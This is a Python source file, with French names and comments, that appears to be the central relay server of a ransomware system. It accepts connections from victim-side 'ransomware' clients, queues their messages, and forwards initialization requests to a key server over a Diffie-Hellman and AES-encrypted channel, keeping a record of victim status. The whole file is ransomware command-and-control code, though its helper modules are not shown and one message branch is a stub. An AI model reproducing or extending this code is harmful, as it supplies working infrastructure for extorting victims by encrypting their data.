import queue
import threading
# from threading import Thread, Lock
import utile.network as network
import utile.message as message
import utile.security as security

# import utile.input as my_input
import utile.config as config

# Constantes
IP_SERV_CLES = network.LOCAL_IP
PORT_SERV_CLES = 8381
CONN_RETRY_SERV_CLES = 60
IP_RANSOMWARE = network.LOCAL_IP
PORT_RANSOMWARE = 8443
CONFIG_SERVEUR = {}
CONFIG_WORKSTATION = {}

# Variable globale
status_victims = {}

# Variable
serv_cles_queue = queue.Queue()
ransomware_queue = queue.Queue()


def handle_serv_cles():
    serv_cle_socket = network.connect_to_serv(IP_SERV_CLES, PORT_SERV_CLES, CONN_RETRY_SERV_CLES)
    key_serv_cle = security.diffie_hellman_send_key(serv_cle_socket)
    while True:
        if not ransomware_queue.empty():
            message_ransomware, socket_ransomware = ransomware_queue.get()
            type_message = message.get_message_type(message_ransomware)
            if type_message == "INITIALIZE":
                message_serv_cle_crypt = security.aes_encrypt(message_ransomware, key_serv_cle)
                network.send_message(serv_cle_socket, message_serv_cle_crypt)
                response_serv_cle_crypt = network.receive_message(serv_cle_socket)
                response_serv_cle = security.aes_decrypt(response_serv_cle_crypt, key_serv_cle)
                serv_cles_queue.put(response_serv_cle)
            if type_message == "KEY_RESP":
                pass


def handle_ransomware():
    ransomware_socket = network.start_net_serv(IP_RANSOMWARE, PORT_RANSOMWARE)
    while True:
        client_socket, address = ransomware_socket.accept()
        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()


def handle_client(socket_client):
    while True:
        message_ransomware = network.receive_message(socket_client)
        if message_ransomware is not None:
            ransomware_queue.put((message_ransomware, socket_client))
        else:
            print("Message ransomware reçu est None. Ignoré.")
            break


def main():
    global CONFIG_SERVEUR, CONFIG_WORKSTATION
    CONFIG_SERVEUR = config.load_config('config/serveur.cfg', 'config/key_serveur.bin')
    CONFIG_WORKSTATION = config.load_config('config/workstation.cfg', 'config/key_workstation.bin')
    serv_cle = threading.Thread(target=handle_serv_cles)
    serv_cle.start()

    ransomware = threading.Thread(target=handle_ransomware)
    ransomware.start()


if __name__ == '__main__':
    main()
